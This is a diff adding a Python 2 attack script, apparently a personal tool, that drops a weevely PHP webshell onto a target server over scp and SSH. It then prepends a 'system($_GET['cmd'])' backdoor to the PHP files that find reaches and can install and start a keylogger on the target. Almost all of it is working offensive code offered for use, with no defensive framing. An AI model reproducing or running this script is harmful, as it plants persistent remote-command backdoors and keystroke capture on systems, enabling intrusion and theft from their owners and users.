@@ -1,0 +1,67 @@
+#!/usr/bin/python
+import os
+import sys
+import pexpect
+from pexpect import pxssh
+import time
+
+print '''
+MULTI WEBSHELL/KEYLOGGER DROP SCRIPT
+WRITTEN BY ANDR01D
+
+***When specifying path to weevely, use format: /home/youruser/...***
+'''
+
+weevely = raw_input("Path to weevely script: ")
+shell_name = raw_input("Name of webshell: ")
+php_pass = raw_input("Password for shell: ")
+os.system("mkdir " + weevely + "/webshells")
+os.system("python " + weevely + "/weevely.py generate " + php_pass + " " + weevely + "/webshells/" + shell_name)
+
+ip = raw_input("Target address: ")
+user = raw_input("Username: ")
+passwd = raw_input(user + "'s password: ")
+
+print "Connecting..."
+time.sleep(2)
+print "Grabbing files..."
+time.sleep(2)
+print "Dropping webshell..."
+child = pexpect.spawn("scp " + weevely + "/webshells/" + shell_name +  " " + user + "@" + ip + ":/var/www/")
+#child = pexpect.spawn('scp /home/andr01d/Documents/Weevely/webshells/webshell.php root@172.16.186.131:/var/www/')
+test = child.expect("password: ")
+if test==0:
+    child.sendline(passwd)
+    child.expect(pexpect.EOF, timeout=10)
+    print "Password sent"
+elif test==1:
+    print "scp not successful"
+print "Shell dropped in /var/www/"
+ssh = pxssh.pxssh()
+ssh.login(ip, user, passwd)
+ssh.sendline("cd /")
+ssh.sendline("find -name '*.php' -exec sed -i '1 s/^/<?php system($_GET('cmd')) ?>\n' {} \;")
+
+
+
+logger = raw_input("Would you like to drop a keylogger?(y/n)")
+#drop the keylogger, then w/ ssh start the logging
+print "Dropping keylogger"
+time.sleep(2)
+
+if logger=='Y':
+    child = pexpect.spawn("scp -r simple-key-logger " + user + "@" + ip + ":/")
+    test = child.expect("password: ")
+    if test==0:
+        child.sendline(passwd)
+        child.expect(pexpect.EOF, timeout=10)
+        print "Password sent"
+    elif test==1:
+        print "scp not successful"
+
+    ssh = pxssh.pxssh()
+    ssh.login(ip, user, passwd)
+    ssh.sendline("cd /")
+    ssh.sendline("cd /simple-key-logger")
+    ssh.sendline("make")
+    ssh.sendline("./skeylogger")
